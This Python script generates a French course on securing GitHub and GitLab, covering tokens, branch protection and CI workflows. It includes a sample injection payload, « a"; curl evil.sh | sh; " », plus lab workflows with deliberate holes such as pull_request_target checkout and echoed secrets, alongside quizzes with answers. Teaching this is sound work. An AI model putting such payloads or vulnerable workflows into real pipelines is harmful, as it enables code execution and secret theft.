#!/usr/bin/env python3
"""Modules « GitHub » et « GitLab » : python3 tool/content/forges_modules.py"""
from common import *

CO = "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2"
NODE = "actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0"

# ====================================================================== GITHUB
G = []

G.append(lesson("compte-securise", "Un compte GitHub bien protégé", 15,
  ["Activer la double authentification", "Choisir entre SSH, jeton fin et gh pour s'authentifier"],
  [t("Votre compte GitHub donne accès à votre code et souvent à celui de votre équipe : activez la double authentification "
     "(application TOTP ou clé de sécurité/passkey) et conservez les codes de secours hors ligne."),
   t("Pour Git, trois options : une clé SSH (ssh -T git@github.com pour tester), un jeton « fine-grained » limité à certains "
     "dépôts, permissions et durée, ou gh auth login qui gère le jeton pour vous dans le trousseau du système."),
   code("gh auth login\ngh auth status\nssh -T git@github.com", "Se connecter avec la CLI, vérifier, tester une clé SSH"),
   warn("Un jeton « classic » avec la portée repo ouvre TOUS vos dépôts : préférez un jeton fin, limité à un dépôt et 7 à 30 jours."),
   tip("Un jeton ne se colle jamais dans un dépôt, un ticket ou une discussion IA : révoquez-le immédiatement s'il a fuité.")],
  [single("gh-1-1", "Quel jeton GitHub limite l'accès à certains dépôts et permissions ?", ["Fine-grained", "Classic avec repo", "Le mot de passe", "La clé GPG"], 0,
          "Le jeton fin choisit dépôts, permissions et date d'expiration."),
   single("gh-1-2", "Que faire d'un jeton publié par erreur ?", ["Le révoquer immédiatement puis en créer un nouveau", "Supprimer le commit suffit", "Rendre le dépôt privé suffit", "Rien s'il est ancien"], 0,
          "Des robots scrutent GitHub en continu : un secret publié est compromis, même effacé."),
   cmd("gh-1-3", "Connectez la CLI GitHub à votre compte.", ["gh auth login"], "gh stocke le jeton dans le trousseau du système."),
   cmd("gh-1-4", "Testez votre clé SSH auprès de GitHub.", ["ssh -T git@github.com"], "GitHub répond avec votre identifiant si la clé est reconnue.")]))

G.append(lesson("depots", "Créer et organiser un dépôt", 15,
  ["Choisir la visibilité d'un dépôt", "Poser README, licence et .gitignore dès le départ"],
  [code("gh repo create mon-projet --private --source=. --remote=origin\ngit push -u origin main", "Créer un dépôt privé depuis un projet local"),
   t("Privé par défaut : on rend public après avoir vérifié l'historique (aucun secret, aucune donnée personnelle). "
     "Rendre un dépôt public expose TOUT l'historique, pas seulement la dernière version."),
   t("Un bon dépôt contient un README (quoi, pourquoi, comment lancer), une LICENSE (sans licence, personne n'a le droit de "
     "réutiliser le code), un .gitignore et, pour un projet ouvert, un CONTRIBUTING et un SECURITY.md."),
   tip("Les modèles de .gitignore de GitHub (gitignore.io aussi) évitent d'oublier build/, .env ou les fichiers d'IDE.")],
  [single("gh-2-1", "Que publie le passage d'un dépôt en public ?", ["Tout l'historique", "La dernière version seulement", "Le README seulement", "Les tickets seulement"], 0,
          "Vérifiez l'historique complet (secrets, données) avant de publier."),
   single("gh-2-2", "Un dépôt public sans fichier LICENSE est…", ["Visible mais non réutilisable légalement", "Libre de droits", "Sous licence MIT", "Interdit"], 0, "Par défaut, l'auteur garde tous les droits."),
   cmd("gh-2-3", "Créez un dépôt privé « atelier » avec gh.", ["gh repo create atelier --private"], "--private évite une publication accidentelle."),
   multi("gh-2-4", "Quels fichiers poser dès le départ ?", ["README", "LICENSE", ".gitignore", ".env avec les mots de passe"], [0, 1, 2],
         "Le .env contient des secrets : il est ignoré, jamais versionné.")]))

G.append(lesson("protection", "Branches protégées et règles", 15,
  ["Protéger la branche principale", "Exiger revue et vérifications avant la fusion"],
  [t("Une règle de protection (ou un « ruleset ») sur main interdit le push direct et le push forcé, exige une pull request "
     "approuvée et des vérifications CI réussies avant la fusion."),
   code("Paramètres → Rules → Rulesets → New branch ruleset\n  ✓ Require a pull request before merging (1 approbation)\n  ✓ Require status checks to pass\n  ✓ Block force pushes",
        "Réglages typiques d'un ruleset sur main"),
   t("CODEOWNERS désigne des relecteurs obligatoires par dossier : un changement dans infra/ demande l'avis de l'équipe infra."),
   warn("Les administrateurs peuvent contourner les règles s'ils ne sont pas inclus : n'ajoutez des exceptions que nommément.")],
  [single("gh-3-1", "Que bloque une protection de branche typique ?", ["Le push direct et le push forcé sur main", "La lecture du code", "Les tickets", "Les forks"], 0, "Toute modification passe par une PR relue."),
   single("gh-3-2", "Rôle de CODEOWNERS ?", ["Désigner des relecteurs obligatoires par chemin", "Lister les contributeurs", "Chiffrer le code", "Gérer la licence"], 0, "Il est lu automatiquement à l'ouverture d'une PR."),
   single("gh-3-3", "Pourquoi exiger les vérifications CI avant fusion ?", ["Ne pas fusionner du code qui casse les tests", "Pour aller plus vite", "Pour publier une release", "Pour fermer les tickets"], 0, "La CI devient un garde-fou, pas une décoration."),
   single("gh-3-4", "Le push forcé sur main…", ["Réécrit l'historique partagé et doit être bloqué", "Est sans danger", "Est obligatoire", "Crée une release"], 0, "Il peut effacer le travail des autres.")]))

G.append(lesson("pull-requests", "Pull requests et revue de code", 20,
  ["Ouvrir une PR claire et petite", "Relire et choisir une stratégie de fusion"],
  [code("git switch -c fix/titre-page\ngit commit -am \"fix: corrige le titre de la page\"\ngit push -u origin fix/titre-page\ngh pr create --fill --draft",
        "Branche, commit, push, PR en brouillon"),
   t("Une bonne PR est petite, explique le pourquoi, montre comment tester et lie le ticket (« Closes #12 » le fermera à la fusion)."),
   t("Trois fusions possibles : merge commit (garde tout l'historique), squash (un seul commit propre), rebase (historique linéaire). "
     "L'équipe en choisit une et s'y tient."),
   tip("En revue, commentez le code, pas la personne ; distinguez « bloquant » de « suggestion ».")],
  [single("gh-4-1", "Que fait « Closes #12 » dans la description d'une PR ?", ["Ferme le ticket 12 à la fusion", "Supprime la PR 12", "Bloque la PR", "Rien"], 0, "Fonctionne aussi avec Fixes ou Resolves."),
   single("gh-4-2", "Fusion « squash » :", ["Regroupe les commits de la PR en un seul", "Garde chaque commit et ajoute un commit de fusion", "Supprime la branche distante seulement", "Annule la PR"], 0, "Historique plus lisible, détail perdu."),
   cmd("gh-4-3", "Ouvrez une PR en brouillon avec titre et description tirés des commits.", ["gh pr create --fill --draft", "gh pr create --draft --fill"], "Brouillon = pas encore prête à relire."),
   cmd("gh-4-4", "Récupérez localement la PR numéro 42 pour la tester.", ["gh pr checkout 42"], "Crée une branche locale avec le code de la PR.")]))

G.append(lesson("tickets", "Issues, labels et suivi", 12,
  ["Écrire un ticket utile", "Organiser le travail avec labels, jalons et Projects"],
  [t("Un bon ticket dit : ce qui se passe, ce qui était attendu, comment reproduire, l'environnement. Les modèles "
     "(.github/ISSUE_TEMPLATE) guident les contributeurs."),
   code("gh issue create --title \"Plantage à l'import\" --label bug\ngh issue list --label bug --state open", "Créer et filtrer des tickets"),
   t("Labels (bug, documentation), jalons (version 1.2) et tableaux Projects donnent une vue d'ensemble sans outil externe."),
   warn("Une trace d'erreur collée dans un ticket public peut contenir un jeton, un chemin ou une adresse : relisez-la avant.")],
  [single("gh-5-1", "Élément indispensable d'un rapport de bug ?", ["Les étapes pour reproduire", "L'humeur du rapporteur", "Le mot de passe", "La liste des contributeurs"], 0, "Sans reproduction, le correctif est un pari."),
   single("gh-5-2", "À quoi sert un jalon (milestone) ?", ["Regrouper les tickets visés pour une version", "Supprimer des tickets", "Chiffrer un ticket", "Lancer la CI"], 0, "Il montre l'avancement vers la version."),
   cmd("gh-5-3", "Listez les tickets ouverts portant le label bug.", ["gh issue list --label bug", "gh issue list --label bug --state open"], "Les filtres se combinent."),
   single("gh-5-4", "Avant de coller un journal dans un ticket public…", ["Le relire et masquer jetons et données", "Le compresser", "Le traduire", "Rien"], 0, "Le journal peut contenir des secrets.")]))

G.append(lesson("releases", "Tags, releases et versions", 15,
  ["Numéroter selon SemVer", "Publier une release avec notes et empreintes"],
  [t("SemVer : MAJEUR.MINEUR.CORRECTIF. On incrémente MAJEUR quand on casse la compatibilité, MINEUR pour une nouveauté "
     "compatible, CORRECTIF pour une correction."),
   code("git tag -a v1.3.0 -m \"v1.3.0\"\ngit push origin v1.3.0\ngh release create v1.3.0 dist/* --notes-file CHANGELOG.md --draft",
        "Tag annoté, push du tag, release en brouillon avec ses artefacts"),
   t("Joignez un fichier SHA256SUMS : l'utilisateur vérifie que l'artefact téléchargé est bien celui que vous avez publié."),
   warn("Ne publiez jamais un APK signé avec la clé debug comme une release : nommez-le explicitement et réservez-le aux tests.")],
  [single("gh-6-1", "Passer de 1.4.2 à 2.0.0 signifie…", ["Changement incompatible", "Correction de bug", "Nouvelle fonction compatible", "Rien de particulier"], 0, "Le MAJEUR signale une rupture."),
   single("gh-6-2", "Pourquoi publier SHA256SUMS ?", ["Permettre de vérifier l'intégrité des artefacts", "Accélérer le téléchargement", "Signer le code", "Remplacer la licence"], 0, "sha256sum -c SHA256SUMS fait la vérification."),
   cmd("gh-6-3", "Créez un tag annoté v1.3.0.", ["git tag -a v1.3.0 -m \"v1.3.0\"", "git tag -a v1.3.0 -m v1.3.0"], "Un tag annoté porte auteur, date et message."),
   cmd("gh-6-4", "Poussez le tag v1.3.0.", ["git push origin v1.3.0"], "Les tags ne partent pas avec un simple git push.")],
  lab("workflow", "Ce workflow de release donne tous les droits au jeton. Accordez l'écriture au seul job qui publie.",
      f"name: Release\non:\n  push:\n    tags: ['v*']\npermissions: write-all\njobs:\n  publier:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 15\n    steps:\n      - uses: {CO}\n        with:\n          persist-credentials: false\n      - run: gh release create \"$GITHUB_REF_NAME\" dist/* --draft\n        env:\n          GH_TOKEN: ${{{{ github.token }}}}\n",
      [no("GH003", "Plus de write-all"), has("contents: write", "Écriture limitée au contenu"), valid()],
      "En tête : permissions: contents: read ; dans le job publier : permissions: contents: write.",
      f"name: Release\non:\n  push:\n    tags: ['v*']\npermissions:\n  contents: read\njobs:\n  publier:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 15\n    permissions:\n      contents: write\n    steps:\n      - uses: {CO}\n        with:\n          persist-credentials: false\n      - run: gh release create \"$GITHUB_REF_NAME\" dist/* --draft\n        env:\n          GH_TOKEN: ${{{{ github.token }}}}\n")))

G.append(lesson("actions-bases", "GitHub Actions : premiers workflows", 20,
  ["Lire la structure d'un workflow", "Limiter les permissions et la durée des jobs"],
  [code("name: CI\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 10\n    steps:\n      - uses: actions/checkout@<sha>\n      - run: npm ci && npm test",
        "Déclencheur, permissions, job, étapes"),
   t("Chaque workflow reçoit un jeton GITHUB_TOKEN. Par défaut, ses droits dépendent des réglages du dépôt — parfois en "
     "écriture. Déclarez « permissions: contents: read » en tête, puis élargissez seulement le job qui en a besoin."),
   t("Sans timeout-minutes, un job bloqué peut tourner 6 heures et consommer vos minutes."),
   tip("act (outil tiers) ou un dépôt d'essai privé permettent de tester un workflow sans polluer le projet.")],
  [single("gh-7-1", "Pourquoi déclarer permissions: contents: read ?", ["Limiter ce que le jeton du workflow peut modifier", "Accélérer le job", "Rendre le dépôt privé", "Obligatoire pour checkout"], 0, "Moindre privilège pour le jeton."),
   single("gh-7-2", "Durée maximale d'un job sans timeout-minutes ?", ["6 heures", "10 minutes", "Illimitée", "1 heure"], 0, "Fixez une limite adaptée."),
   single("gh-7-3", "Où se trouvent les workflows ?", [".github/workflows/", ".gitlab-ci.yml", "ci/", "Paramètres du dépôt seulement"], 0, "Un fichier YAML par workflow."),
   cmd("gh-7-4", "Listez les dernières exécutions de workflows avec gh.", ["gh run list"], "gh run view et gh run watch suivent une exécution.")],
  lab("workflow", "Ce workflow laisse au jeton les droits par défaut et n'a aucune limite de durée. Corrigez-le.",
      f"name: CI\non:\n  pull_request:\njobs:\n  test:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: {CO}\n        with:\n          persist-credentials: false\n      - run: npm ci && npm test\n",
      [no("GH002", "Permissions déclarées"), no("GH006", "Durée limitée"), valid()],
      "Ajoutez « permissions: contents: read » au niveau du workflow et « timeout-minutes: 10 » au job.",
      f"name: CI\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 10\n    steps:\n      - uses: {CO}\n        with:\n          persist-credentials: false\n      - run: npm ci && npm test\n")))

G.append(lesson("actions-epinglees", "Actions tierces : épingler et réduire", 18,
  ["Comprendre le risque d'une étiquette mobile", "Épingler une action par empreinte de commit"],
  [t("uses: une-org/une-action@v3 suit une étiquette que l'auteur (ou un attaquant qui a volé son compte) peut déplacer vers "
     "un autre code. Votre workflow exécuterait alors ce nouveau code avec vos secrets."),
   code("- uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0", "Épinglage par empreinte, version en commentaire"),
   t("L'empreinte (40 caractères) désigne un contenu immuable. Dependabot sait mettre à jour ces empreintes et le commentaire."),
   tip("Moins d'actions tierces = moins de risques : une ligne run: de trois commandes vaut souvent mieux qu'une action obscure.")],
  [single("gh-8-1", "Pourquoi @v3 est-il risqué ?", ["L'étiquette peut être déplacée vers un autre code", "v3 est obsolète", "Les étiquettes sont interdites", "C'est plus lent"], 0, "Seule l'empreinte de commit est immuable."),
   single("gh-8-2", "Quelle référence est immuable ?", ["@11bd71901bbe5b1630ceea73d27597364c9af683", "@v4", "@main", "@latest"], 0, "Une empreinte de 40 caractères."),
   single("gh-8-3", "Qui peut tenir les empreintes à jour ?", ["Dependabot", "Personne", "GitHub Pages", "Le README"], 0, "Il propose des PR avec la nouvelle empreinte."),
   single("gh-8-4", "Une alternative à une action tierce simple ?", ["Quelques lignes run: lisibles", "Ignorer la CI", "Désactiver les permissions", "Copier un jeton"], 0, "Moins de dépendances, moins de surface d'attaque.")],
  lab("workflow", "Ces actions suivent des étiquettes mobiles. Épinglez-les par empreinte de commit.",
      "name: CI\non:\n  push:\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 10\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          persist-credentials: false\n      - uses: actions/setup-node@v4\n      - run: npm ci\n",
      [no("GH001", "Toutes les actions épinglées par empreinte"), valid()],
      "checkout : 11bd71901bbe5b1630ceea73d27597364c9af683 (v4.2.2) ; setup-node : 39370e3970a6d050c480ffad4ff0ed4d3fdee5af (v4.1.0).",
      f"name: CI\non:\n  push:\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 10\n    steps:\n      - uses: {CO}\n        with:\n          persist-credentials: false\n      - uses: {NODE}\n      - run: npm ci\n")))

G.append(lesson("secrets-injection", "Secrets et injections dans les workflows", 22,
  ["Utiliser les secrets sans les exposer", "Éviter l'injection de commandes par des données tierces"],
  [t("Les secrets (Paramètres → Secrets and variables → Actions) sont masqués dans les journaux, mais un echo, un encodage ou "
     "une erreur peuvent les révéler. Ne les affichez jamais et passez-les par env: au seul outil qui en a besoin."),
   code("- run: echo \"Titre : ${{ github.event.issue.title }}\"   # DANGEREUX\n- env:\n    TITRE: ${{ github.event.issue.title }}\n  run: echo \"Titre : $TITRE\"           # sûr",
        "Le titre d'un ticket est écrit par n'importe qui"),
   t("${{ … }} est remplacé AVANT que le shell ne lise la commande : un titre comme « a\"; curl evil.sh | sh; \" » devient du code. "
     "Passé par une variable d'environnement, il reste une simple donnée."),
   t("Les « environments » (production) ajoutent relecteurs obligatoires et secrets réservés au déploiement.")],
  [single("gh-9-1", "Pourquoi ${{ github.event.issue.title }} dans run: est-il dangereux ?", ["Le texte est inséré dans la commande avant son exécution", "Il est trop long", "Il est chiffré", "Il est vide"], 0, "Injection de commandes."),
   single("gh-9-2", "Comment utiliser une donnée tierce dans run: ?", ["La passer par env: puis \"$VARIABLE\"", "La mettre entre accents graves", "L'afficher avec echo", "La mettre dans le nom du job"], 0, "Elle reste une donnée."),
   single("gh-9-3", "Un secret masqué dans les journaux peut-il fuiter ?", ["Oui, s'il est affiché transformé ou envoyé ailleurs", "Non, jamais", "Seulement sur GitLab", "Seulement en privé"], 0, "Le masquage est un filet, pas une garantie."),
   single("gh-9-4", "À quoi sert un environment « production » ?", ["Exiger une approbation et isoler les secrets de déploiement", "Accélérer les jobs", "Créer un fork", "Supprimer les PR"], 0, "Le job attend la validation d'un relecteur.")],
  lab("workflow", "Ce workflow de tri des tickets est vulnérable à l'injection et affiche un secret. Corrigez-le.",
      f"name: Tri\non:\n  issues:\n    types: [opened]\npermissions:\n  issues: write\njobs:\n  tri:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 5\n    steps:\n      - run: |\n          echo \"Nouveau ticket : ${{{{ github.event.issue.title }}}}\"\n          echo \"Jeton : ${{{{ secrets.BOT_TOKEN }}}}\"\n",
      [no("GH005", "Plus d'injection"), no("GH008", "Aucun secret affiché"), clean()],
      "Passez le titre par env: (TITRE) et supprimez l'affichage du jeton.",
      "name: Tri\non:\n  issues:\n    types: [opened]\npermissions:\n  issues: write\njobs:\n  tri:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 5\n    steps:\n      - env:\n          TITRE: ${{ github.event.issue.title }}\n        run: |\n          echo \"Nouveau ticket : $TITRE\"\n")))

G.append(lesson("contributions-externes", "Contributions externes et forks", 18,
  ["Comprendre pull_request et pull_request_target", "Construire le code d'un contributeur sans lui donner vos secrets"],
  [t("Sur une PR venant d'un fork, l'événement pull_request s'exécute sans secrets et avec un jeton en lecture seule : "
     "c'est voulu, car le code de la PR n'est pas encore relu."),
   warn("pull_request_target s'exécute dans le contexte de VOTRE dépôt, avec secrets et jeton en écriture. Y faire un checkout "
        "du code de la PR revient à exécuter le code d'un inconnu avec vos clés."),
   t("Bonne pratique : construire et tester avec pull_request ; réserver pull_request_target aux actions qui ne lisent pas le "
     "code de la PR (étiqueter, commenter)."),
   tip("Réglage utile : exiger l'approbation des workflows pour les nouveaux contributeurs (Settings → Actions).")],
  [single("gh-10-1", "Une PR de fork déclenchée par pull_request reçoit-elle les secrets ?", ["Non", "Oui, tous", "Seulement GITHUB_TOKEN en écriture", "Oui si le dépôt est public"], 0, "Protection par défaut."),
   single("gh-10-2", "Danger de pull_request_target + checkout du code de la PR ?", ["Exécuter du code inconnu avec vos secrets", "Le job est plus lent", "Aucun", "La PR est fermée"], 0, "Une vulnérabilité classique (« pwn request »)."),
   single("gh-10-3", "Pour tester le code d'un contributeur externe, utilisez…", ["pull_request", "pull_request_target", "workflow_dispatch avec secrets", "schedule"], 0, "Sans secrets, sans écriture."),
   single("gh-10-4", "Usage raisonnable de pull_request_target ?", ["Étiqueter la PR sans exécuter son code", "Construire la PR", "Déployer la PR", "Publier une release"], 0, "Ne lit pas le code non relu.")],
  lab("workflow", "Ce workflow construit le code des PR externes avec les secrets du dépôt. Rendez-le sûr.",
      f"name: Tests PR\non:\n  pull_request_target:\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 15\n    steps:\n      - uses: {CO}\n        with:\n          ref: ${{{{ github.event.pull_request.head.sha }}}}\n          persist-credentials: false\n      - run: npm ci && npm test\n",
      [no("GH004", "Le code externe ne s'exécute plus avec les secrets"), clean()],
      "Remplacez le déclencheur par pull_request et retirez le ref : checkout prendra le code de la PR sans secrets.",
      f"name: Tests PR\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 15\n    steps:\n      - uses: {CO}\n        with:\n          persist-credentials: false\n      - run: npm ci && npm test\n")))

github_project = {"title": "Workflow de CI prêt pour un projet ouvert",
  "brief": "Un projet open source va accepter des contributions. Rédigez un workflow de CI sûr : moindre privilège, actions épinglées, pas d'injection ni de fuite de secret.",
  "lab": lab("workflow", "Objectif : aucun problème bloquant ni avertissement.",
      "name: CI\non:\n  pull_request_target:\n  push:\n    branches: [main]\npermissions: write-all\njobs:\n  test:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@main\n      - uses: actions/setup-node@v4\n"
      "      - run: echo \"Branche ${{ github.head_ref }}\"\n      - run: npm ci && npm test\n        env:\n          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n      - run: echo ${{ secrets.NPM_TOKEN }}\n",
      [clean(), nowarn(), no("GH003", "Plus de write-all"), no("GH004", "Plus de pull_request_target avec checkout")],
      "Reprenez les labos : déclencheur pull_request, permissions en lecture, empreintes, env: pour les données tierces, aucun secret affiché, timeout.",
      f"name: CI\non:\n  pull_request:\n  push:\n    branches: [main]\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 15\n    steps:\n      - uses: {CO}\n        with:\n          persist-credentials: false\n      - uses: {NODE}\n"
      "      - env:\n          BRANCHE: ${{ github.head_ref }}\n        run: echo \"Branche $BRANCHE\"\n      - run: npm ci && npm test\n"),
  "rubric": rubric(
    ("Permissions", "write-all ou par défaut", "contents: read global", "Lecture globale, écriture ciblée par job et justifiée"),
    ("Dépendances", "Étiquettes mobiles", "Empreintes de commit", "Empreintes tenues à jour par Dependabot, actions tierces minimales"),
    ("Contributions externes", "pull_request_target + checkout", "pull_request", "pull_request et approbation des nouveaux contributeurs"),
    ("Secrets", "Affichés ou injectés", "Passés par env:", "Environnement protégé, secrets limités au job de déploiement"),
    ("Exploitation", "Pas de délai", "timeout-minutes", "Délais, concurrence (cancel-in-progress) et cache"))}

github_glossary = [
  ("Pull request", "Proposition de fusion d'une branche, discutée et relue."), ("Fork", "Copie d'un dépôt sous un autre compte."),
  ("Ruleset", "Ensemble de règles protégeant des branches ou des tags."), ("CODEOWNERS", "Fichier désignant les relecteurs par chemin."),
  ("Issue", "Ticket de suivi (bug, idée, tâche)."), ("Release", "Version publiée, associée à un tag, avec notes et artefacts."),
  ("SemVer", "Numérotation MAJEUR.MINEUR.CORRECTIF."), ("Workflow", "Fichier YAML de GitHub Actions dans .github/workflows/."),
  ("GITHUB_TOKEN", "Jeton automatique fourni à chaque exécution de workflow."), ("Épinglage", "Référencer une action par empreinte de commit."),
  ("Injection de script", "Donnée tierce interprétée comme du code dans run:."), ("pull_request_target", "Déclencheur s'exécutant avec les droits du dépôt cible."),
  ("Environment", "Cible de déploiement avec approbations et secrets dédiés."), ("Jeton fine-grained", "Jeton limité à des dépôts, permissions et durée."),
]

write_module("github", "GitHub, le port de commerce",
  "Sécuriser son compte, organiser dépôts, PR, tickets et releases, et écrire des workflows GitHub Actions sûrs.",
  ["Protéger son compte et ses jetons", "Collaborer par pull requests relues sur une branche protégée",
   "Publier des releases vérifiables", "Écrire des workflows à moindre privilège, épinglés et sans injection"],
  ["Module Git"], G, github_project, github_glossary)

# ====================================================================== GITLAB
T = []

T.append(lesson("projets-groupes", "Projets, groupes et accès", 15,
  ["Organiser projets et groupes", "Attribuer le bon rôle à chacun"],
  [t("GitLab range les projets dans des groupes et sous-groupes : membres, variables CI et règles se définissent une fois "
     "au niveau du groupe et s'héritent."),
   t("Rôles : Guest, Reporter (lecture), Developer (pousser sur des branches non protégées), Maintainer (gérer le projet), "
     "Owner. Donnez le rôle minimal nécessaire, avec une date d'expiration pour les prestataires."),
   code("glab auth login\nglab repo create mon-projet --private\nglab repo clone groupe/mon-projet", "CLI officielle de GitLab"),
   warn("Jeton d'accès personnel : portées minimales (read_repository plutôt que api) et date d'expiration courte. "
        "Les deploy tokens et deploy keys servent aux machines, pas aux humains.")],
  [single("gl-1-1", "Rôle minimal pour pousser sur une branche non protégée ?", ["Developer", "Guest", "Reporter", "Owner"], 0, "Reporter ne fait que lire."),
   single("gl-1-2", "Avantage des groupes GitLab ?", ["Membres et variables hérités par les projets", "Plus de stockage", "Pas besoin de Git", "Projets publics forcés"], 0, "Une configuration, plusieurs projets."),
   cmd("gl-1-3", "Connectez la CLI GitLab à votre compte.", ["glab auth login"], "glab fonctionne avec gitlab.com et les instances auto-hébergées."),
   single("gl-1-4", "Pour qu'un serveur clone un dépôt en lecture seule, on utilise…", ["Une deploy key ou un deploy token", "Le mot de passe d'un développeur", "Un jeton api de l'Owner", "Un compte partagé"], 0, "Accès machine, limité et révocable.")]))

T.append(lesson("merge-requests", "Merge requests et approbations", 18,
  ["Ouvrir une MR claire", "Exiger des approbations et une pipeline réussie"],
  [code("git switch -c feat/export-csv\ngit push -u origin feat/export-csv\nglab mr create --fill --draft", "Branche, push, MR en brouillon"),
   t("Une MR « Draft » ne peut pas être fusionnée par erreur. « Closes #7 » dans la description fermera le ticket à la fusion."),
   t("Réglages du projet → Merge requests : « Pipelines must succeed », nombre d'approbations requis, règles d'approbation par "
     "fichier via CODEOWNERS."),
   tip("Les suggestions de code dans les commentaires s'appliquent en un clic par l'auteur.")],
  [single("gl-2-1", "Intérêt d'une MR en Draft ?", ["Elle ne peut pas être fusionnée tant qu'elle est en brouillon", "Elle est privée", "Elle saute la CI", "Elle supprime la branche"], 0, "On la passe en prête quand elle l'est."),
   single("gl-2-2", "Que garantit « Pipelines must succeed » ?", ["Pas de fusion si la pipeline échoue", "Pipeline plus rapide", "Fusion automatique", "Aucun test"], 0, "La CI devient bloquante."),
   cmd("gl-2-3", "Créez une MR en brouillon avec glab, contenu tiré des commits.", ["glab mr create --fill --draft", "glab mr create --draft --fill"], "Équivalent de gh pr create."),
   single("gl-2-4", "Que ferme « Closes #7 » à la fusion ?", ["Le ticket 7", "La MR 7", "La pipeline 7", "Rien"], 0, "Mot-clé de fermeture automatique.")]))

T.append(lesson("tickets-tableaux", "Issues, tableaux et jalons", 12,
  ["Suivre le travail avec issues et labels", "Visualiser l'avancement sur un tableau"],
  [t("Les issues GitLab portent labels, poids, échéance et jalon. Les labels « scopés » (statut::en-cours) s'excluent mutuellement."),
   code("glab issue create --title \"Export CSV vide\" --label bug\nglab issue list --label bug", "Créer et filtrer"),
   t("Le tableau (Issue board) affiche une colonne par label : déplacer une carte change son label."),
   warn("Les issues confidentielles existent pour les failles de sécurité : ne décrivez jamais une vulnérabilité dans un ticket public.")],
  [single("gl-3-1", "Particularité d'un label scopé statut::fait ?", ["Il remplace les autres labels statut::", "Il est privé", "Il ferme le ticket", "Il lance la CI"], 0, "Un seul statut à la fois."),
   single("gl-3-2", "Où signaler une faille de sécurité ?", ["Issue confidentielle ou canal privé du projet", "Ticket public", "Commentaire de MR", "README"], 0, "La divulgation responsable protège les utilisateurs."),
   cmd("gl-3-3", "Listez les tickets portant le label bug avec glab.", ["glab issue list --label bug"], "Même logique que gh."),
   single("gl-3-4", "Déplacer une carte sur un tableau…", ["Change son label", "Supprime le ticket", "Crée une MR", "N'a aucun effet"], 0, "Les colonnes sont des labels.")]))

T.append(lesson("protections", "Branches et tags protégés", 12,
  ["Protéger main et les tags de version", "Comprendre le lien avec les variables protégées"],
  [t("Paramètres → Dépôt → Branches protégées : qui peut pousser (souvent « personne », tout passe par MR), qui peut fusionner, "
     "push forcé interdit."),
   t("Les tags protégés (v*) empêchent quiconque de créer ou déplacer une version publiée."),
   t("Une variable CI « protégée » n'est fournie qu'aux pipelines des branches et tags protégés : une branche de test ne "
     "reçoit pas les secrets de production."),
   tip("Protégez aussi les branches release/* si vous en utilisez.")],
  [single("gl-4-1", "Réglage courant pour main ?", ["Personne ne pousse directement, fusion par MR", "Tout le monde pousse", "Push forcé autorisé", "Lecture seule pour tous"], 0, "Toute modification est relue."),
   single("gl-4-2", "Pourquoi protéger les tags v* ?", ["Empêcher de créer ou déplacer une version publiée", "Accélérer git", "Supprimer les anciennes versions", "Obligatoire"], 0, "Une version publiée doit rester stable."),
   single("gl-4-3", "Une variable protégée est disponible…", ["Seulement sur branches et tags protégés", "Partout", "Jamais", "Seulement dans les MR de forks"], 0, "Isolation des secrets."),
   single("gl-4-4", "Le push forcé sur main protégée est…", ["Interdit par défaut", "Recommandé", "Obligatoire", "Sans effet"], 0, "Il réécrirait l'historique partagé.")]))

T.append(lesson("pipelines", "Pipelines GitLab CI : les bases", 20,
  ["Lire stages, jobs et image", "Épingler l'image d'exécution"],
  [code("stages: [test, build]\n\ntests:\n  stage: test\n  image: node:22.11-slim\n  script:\n    - npm ci\n    - npm test", "Un .gitlab-ci.yml minimal"),
   t("Les jobs d'un même stage tournent en parallèle ; le stage suivant attend. needs: permet de casser cet ordre pour gagner du temps."),
   t("image: node (donc node:latest) change sans prévenir : un build vert hier peut casser demain. Épinglez la version."),
   tip("CI Lint (Build → Pipeline editor) valide la syntaxe avant de committer.")],
  [single("gl-5-1", "Les jobs d'un même stage…", ["S'exécutent en parallèle", "S'exécutent l'un après l'autre", "Ne s'exécutent jamais", "Partagent le même conteneur"], 0, "Le stage suivant attend leur fin."),
   single("gl-5-2", "Pourquoi éviter image: node ?", ["latest change sans prévenir", "node n'existe pas", "C'est plus lent", "Obligatoire de mettre alpine"], 0, "Une image épinglée rend le build reproductible."),
   single("gl-5-3", "Rôle de needs: ?", ["Démarrer un job dès que ses dépendances sont finies", "Installer des paquets", "Définir des secrets", "Bloquer la pipeline"], 0, "Graphe acyclique plutôt que stages stricts."),
   single("gl-5-4", "Où valider la syntaxe d'une pipeline ?", ["Pipeline editor / CI Lint", "Wiki", "Issues", "Registre"], 0, "Il valide la syntaxe avant de committer.")],
  lab("gitlabci", "Cette pipeline dépend d'images mobiles. Épinglez-les.",
      "stages: [test]\n\ntests:\n  stage: test\n  image: node\n  script:\n    - npm ci\n    - npm test\n\nlint:\n  stage: test\n  image: node:latest\n  script:\n    - npm run lint\n",
      [no("GL001", "Images épinglées"), valid()], "Utilisez par exemple node:22.11-slim pour les deux jobs.",
      "stages: [test]\n\ntests:\n  stage: test\n  image: node:22.11-slim\n  script:\n    - npm ci\n    - npm test\n\nlint:\n  stage: test\n  image: node:22.11-slim\n  script:\n    - npm run lint\n")))

